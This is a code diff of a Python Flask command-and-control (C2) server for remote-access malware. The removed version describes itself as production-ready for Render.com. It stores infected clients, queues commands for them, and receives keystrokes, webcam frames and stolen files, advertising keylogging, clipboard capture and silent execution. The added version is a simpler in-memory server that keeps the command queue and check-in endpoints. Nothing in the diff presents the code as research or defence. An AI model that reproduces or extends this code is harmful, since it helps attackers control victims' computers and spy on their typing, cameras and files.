@@ -1,246 +1,163 @@
-#!/usr/bin/env python3
-"""
-Enhanced C2 Server - Production Ready for Render.com
-"""
-from flask import Flask, request, jsonify, send_file, Response
-from flask_cors import CORS
-import sqlite3
-import json
+# In your server.py file, update these endpoints:
+
+from flask import Flask, request, jsonify
 import time
-import threading
-from datetime import datetime
-import os
-import io
-import base64
+import uuid
 
 app = Flask(__name__)
-CORS(app)
 
-# Use environment variable for port (Render requirement)
-PORT = int(os.environ.get('PORT', 5000))
-
-def init_db():
-    conn = sqlite3.connect('c2.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("""CREATE TABLE IF NOT EXISTS clients (
-        id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT, ip TEXT,
-        first_seen TEXT, last_seen TEXT, status TEXT, info TEXT, 
-        camera_available INTEGER, screen_size TEXT)""")
-    c.execute("""CREATE TABLE IF NOT EXISTS commands (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, command TEXT,
-        status TEXT, created_at TEXT, executed_at TEXT, output TEXT)""")
-    c.execute("""CREATE TABLE IF NOT EXISTS files (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, filename TEXT,
-        content BLOB, uploaded_at TEXT, file_type TEXT)""")
-    c.execute("""CREATE TABLE IF NOT EXISTS camera_feeds (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, 
-        frame BLOB, timestamp TEXT)""")
-    c.execute("""CREATE TABLE IF NOT EXISTS keystrokes (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT,
-        data TEXT, timestamp TEXT)""")
-    conn.commit()
-    conn.close()
-
-init_db()
-
-@app.route('/')
-def index():
-    return jsonify({
-        'name': 'Enhanced C2 Server',
-        'version': '2.0',
-        'status': 'running',
-        'features': ['camera', 'screen_record', 'keylog', 'clipboard', 'silent_exec']
-    })
-
-@app.route('/api/checkin', methods=['POST'])
-def checkin():
-    data = request.json
-    client_id = data.get('id')
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("SELECT id FROM clients WHERE id=?", (client_id,))
-    now = datetime.now().isoformat()
-    
-    if c.fetchone():
-        c.execute("""UPDATE clients SET last_seen=?, status='online', ip=?, 
-                     camera_available=?, screen_size=? WHERE id=?""",
-                 (now, request.remote_addr, data.get('camera', 0), 
-                  data.get('screen_size', ''), client_id))
-    else:
-        c.execute("""INSERT INTO clients VALUES (?,?,?,?,?,?,?,'online',?,?,?)""",
-                 (client_id, data.get('hostname'), data.get('username'), 
-                  data.get('os'), request.remote_addr, now, now,
-                  json.dumps(data.get('info',{})), data.get('camera', 0),
-                  data.get('screen_size', '')))
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/commands/<client_id>')
-def get_commands(client_id):
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("SELECT id, command FROM commands WHERE client_id=? AND status='pending'", 
-              (client_id,))
-    commands = [{'id': r[0], 'command': r[1]} for r in c.fetchall()]
-    conn.close()
-    return jsonify({'commands': commands})
-
-@app.route('/api/result', methods=['POST'])
-def submit_result():
-    data = request.json
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""UPDATE commands SET status='completed', executed_at=?, output=? 
-                 WHERE id=?""",
-             (datetime.now().isoformat(), data.get('output'), data.get('command_id')))
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/clients')
-def list_clients():
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""SELECT id,hostname,username,os,ip,first_seen,last_seen,status,
-                 camera_available,screen_size FROM clients ORDER BY last_seen DESC""")
-    clients = [{'id':r[0],'hostname':r[1],'username':r[2],'os':r[3],'ip':r[4],
-                'first_seen':r[5],'last_seen':r[6],'status':r[7],
-                'camera':r[8],'screen':r[9]} for r in c.fetchall()]
-    conn.close()
-    return jsonify({'clients': clients})
+# Store commands in memory (use database in production)
+pending_commands = {}
+command_results = {}
 
 @app.route('/api/command', methods=['POST'])
 def send_command():
-    data = request.json
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""INSERT INTO commands (client_id,command,status,created_at) 
-                 VALUES (?,?,'pending',?)""",
-             (data.get('client_id'), data.get('command'), datetime.now().isoformat()))
-    cmd_id = c.lastrowid
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'ok', 'command_id': cmd_id})
+    try:
+        data = request.json
+        if not data:
+            return jsonify({'error': 'No JSON data provided'}), 400
+        
+        client_id = data.get('client_id')
+        command = data.get('command')
+        
+        if not client_id or not command:
+            return jsonify({'error': 'Missing client_id or command'}), 400
+        
+        # Generate unique command ID
+        command_id = str(uuid.uuid4())
+        
+        # Store command
+        pending_commands[command_id] = {
+            'client_id': client_id,
+            'command': command,
+            'status': 'pending',
+            'created_at': time.time(),
+            'updated_at': time.time()
+        }
+        
+        # Initialize result storage
+        command_results[command_id] = {
+            'output': '',
+            'status': 'pending'
+        }
+        
+        print(f"[SERVER] Command received: {command_id} for {client_id}: {command}")
+        
+        return jsonify({
+            'success': True,
+            'command_id': command_id,
+            'message': 'Command queued'
+        }), 200
+        
+    except Exception as e:
+        print(f"[SERVER ERROR] /api/command: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/camera/frame', methods=['POST'])
-def upload_camera_frame():
-    """Receive camera frame from client"""
-    client_id = request.form.get('client_id')
-    frame_data = request.form.get('frame')  # Base64 encoded
-    
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""INSERT INTO camera_feeds (client_id, frame, timestamp) 
-                 VALUES (?, ?, ?)""",
-             (client_id, frame_data, datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-    
-    return jsonify({'status': 'ok'})
+@app.route('/api/command/result', methods=['POST'])
+def submit_result():
+    """Client submits command result"""
+    try:
+        data = request.json
+        command_id = data.get('command_id')
+        output = data.get('output', '')
+        
+        if not command_id:
+            return jsonify({'error': 'Missing command_id'}), 400
+        
+        if command_id in command_results:
+            command_results[command_id] = {
+                'output': output,
+                'status': 'completed',
+                'completed_at': time.time()
+            }
+            
+            if command_id in pending_commands:
+                pending_commands[command_id]['status'] = 'completed'
+                pending_commands[command_id]['updated_at'] = time.time()
+            
+            print(f"[SERVER] Result received for {command_id}: {len(output)} chars")
+            
+            return jsonify({'success': True}), 200
+        else:
+            return jsonify({'error': 'Command not found'}), 404
+            
+    except Exception as e:
+        print(f"[SERVER ERROR] /api/command/result: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/camera/latest/<client_id>')
-def get_latest_frame(client_id):
-    """Get latest camera frame"""
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""SELECT frame, timestamp FROM camera_feeds 
-                 WHERE client_id=? ORDER BY timestamp DESC LIMIT 1""",
-             (client_id,))
-    result = c.fetchone()
-    conn.close()
-    
-    if result:
-        return jsonify({'frame': result[0], 'timestamp': result[1]})
-    return jsonify({'error': 'No frames'}), 404
+@app.route('/api/command/result/<command_id>', methods=['GET'])
+def get_result(command_id):
+    """Console fetches command result"""
+    if command_id in command_results:
+        result = command_results[command_id]
+        return jsonify({
+            'success': True,
+            'status': result.get('status', 'pending'),
+            'output': result.get('output', ''),
+            'command_id': command_id
+        }), 200
+    else:
+        return jsonify({
+            'success': False,
+            'error': 'Command not found',
+            'status': 'unknown'
+        }), 404
 
-@app.route('/api/keylog', methods=['POST'])
-def upload_keylog():
-    """Receive keylog data"""
-    data = request.json
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""INSERT INTO keystrokes (client_id, data, timestamp) 
-                 VALUES (?, ?, ?)""",
-             (data.get('client_id'), data.get('data'), datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'ok'})
+@app.route('/api/commands/<client_id>', methods=['GET'])
+def get_commands(client_id):
+    """Client fetches pending commands"""
+    try:
+        commands = []
+        for cmd_id, cmd_data in pending_commands.items():
+            if cmd_data['client_id'] == client_id and cmd_data['status'] == 'pending':
+                commands.append({
+                    'id': cmd_id,
+                    'command': cmd_data['command']
+                })
+                # Mark as sent (optional)
+                pending_commands[cmd_id]['status'] = 'sent'
+                pending_commands[cmd_id]['sent_at'] = time.time()
+        
+        return jsonify({'commands': commands}), 200
+    except Exception as e:
+        print(f"[SERVER ERROR] /api/commands: {e}")
+        return jsonify({'commands': []}), 500
 
-@app.route('/api/keylog/<client_id>')
-def get_keylogs(client_id):
-    """Get keylog data"""
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""SELECT data, timestamp FROM keystrokes 
-                 WHERE client_id=? ORDER BY timestamp DESC LIMIT 100""",
-             (client_id,))
-    logs = [{'data': r[0], 'timestamp': r[1]} for r in c.fetchall()]
-    conn.close()
-    return jsonify({'logs': logs})
+@app.route('/api/clients', methods=['GET'])
+def get_clients():
+    """Get list of connected clients"""
+    # You should implement proper client tracking
+    clients = [
+        {
+            'id': 'test_client_123',
+            'hostname': 'localhost',
+            'username': 'user',
+            'os': 'Windows',
+            'status': 'online',
+            'last_seen': time.time()
+        }
+    ]
+    return jsonify({'clients': clients}), 200
 
-@app.route('/api/upload', methods=['POST'])
-def upload_file():
-    client_id = request.form.get('client_id')
-    filename = request.form.get('filename')
-    file_type = request.form.get('type', 'file')
-    file = request.files.get('file')
-    
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""INSERT INTO files (client_id,filename,content,uploaded_at,file_type) 
-                 VALUES (?,?,?,?,?)""",
-             (client_id, filename, file.read(), datetime.now().isoformat(), file_type))
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/stats')
-def stats():
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("SELECT COUNT(*) FROM clients")
-    total = c.fetchone()[0]
-    c.execute("SELECT COUNT(*) FROM clients WHERE status='online'")
-    online = c.fetchone()[0]
-    c.execute("SELECT COUNT(*) FROM clients WHERE camera_available=1")
-    with_camera = c.fetchone()[0]
-    conn.close()
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
     return jsonify({
-        'total_clients': total,
-        'online_clients': online,
-        'clients_with_camera': with_camera
-    })
+        'online_clients': 1,
+        'total_commands': len(pending_commands),
+        'pending_commands': len([c for c in pending_commands.values() if c['status'] == 'pending']),
+        'server_time': time.time()
+    }), 200
 
-@app.route('/api/commands/history/<client_id>')
-def history(client_id):
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("""SELECT id,command,status,created_at,executed_at,output 
-                 FROM commands WHERE client_id=? ORDER BY created_at DESC LIMIT 50""",
-             (client_id,))
-    cmds = [{'id':r[0],'command':r[1],'status':r[2],'created_at':r[3],
-             'executed_at':r[4],'output':r[5]} for r in c.fetchall()]
-    conn.close()
-    return jsonify({'commands': cmds})
-
-def check_offline():
-    while True:
-        time.sleep(60)
-        conn = sqlite3.connect('c2.db')
-        c = conn.cursor()
-        timeout = datetime.fromtimestamp(time.time() - 300).isoformat()
-        c.execute("""UPDATE clients SET status='offline' 
-                     WHERE last_seen < ? AND status='online'""", (timeout,))
-        conn.commit()
-        conn.close()
-
-threading.Thread(target=check_offline, daemon=True).start()
+@app.route('/api/checkin', methods=['POST'])
+def checkin():
+    """Client checkin endpoint"""
+    try:
+        data = request.json
+        print(f"[SERVER] Checkin from: {data}")
+        return jsonify({'status': 'ok'}), 200
+    except:
+        return jsonify({'status': 'ok'}), 200
 
 if __name__ == '__main__':
-    print("="*70)
-    print("ENHANCED C2 SERVER STARTING")
-    print("="*70)
-    print(f"Port: {PORT}")
-    print("="*70)
-    app.run(host='0.0.0.0', port=PORT, debug=False)
+    print("[SERVER] Starting C2 server on http://0.0.0.0:5000")
+    app.run(host='0.0.0.0', port=5000, debug=True)
